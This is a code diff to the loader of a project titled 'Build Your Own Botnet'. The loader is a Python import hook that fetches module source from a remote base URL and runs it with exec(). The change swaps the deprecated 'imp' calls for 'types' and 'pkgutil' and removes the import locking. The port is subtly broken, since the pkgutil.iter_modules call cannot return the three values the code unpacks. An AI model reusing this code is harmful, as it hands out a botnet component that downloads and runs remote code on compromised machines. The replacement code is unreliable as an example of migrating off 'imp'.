@@ -3,7 +3,8 @@
 'Loader (Build Your Own Botnet)'
 
 # standard library
-import imp
+import types
+import pkgutil
 import sys
 import logging
 import contextlib
@@ -45,7 +46,7 @@ class Loader(object):
             return None
         log(level='info', info= "Checking if built-in....")
         try:
-            file, filename, description = imp.find_module(fullname.split('.')[-1], path)
+            file, filename, description = pkgutil.iter_modules(fullname.split('.')[-1], path)
             if filename:
                 log(level='info', info= "[-] Found locally!")
                 return None
@@ -69,16 +70,13 @@ class Loader(object):
         '''
         mod_msg=self.mod_msg.get(fullname)
         '''
-        imp.acquire_lock()
         log(level='debug', info= "LOADER=================")
         log(level='debug', info= "Loading %s..." % name)
         if name in sys.modules and not self.reload:
             log(level='info', info= '[+] Module "%s" already loaded!' % name)
-            imp.release_lock()
             return sys.modules[name]
         if name.split('.')[-1] in sys.modules and not self.reload:
             log(level='info', info= '[+] Module "%s" loaded as a top level module!' % name)
-            imp.release_lock()
             return sys.modules[name.split('.')[-1]]
         module_url = self.base_url + '%s.py' % name.replace('.', '/')
         package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
@@ -110,10 +108,9 @@ class Loader(object):
             except IOError as e:
                 module_src = None
                 log(level='info', info= "[-] '%s' is not a module (%s)" % (name, str(e)))
-                imp.release_lock()
                 return None
         log(level='debug', info= "[+] Importing '%s'" % name)
-        mod = imp.new_module(name)
+        mod = types.ModuleType(name)
         mod.__loader__ = self
         mod.__file__ = final_url
         if not package_src:
@@ -125,7 +122,6 @@ class Loader(object):
         sys.modules[name] = mod
         exec(final_src, mod.__dict__)
         log(level='info', info= "[+] '%s' imported succesfully!" % name)
-        imp.release_lock()
         return mod
     
     '''
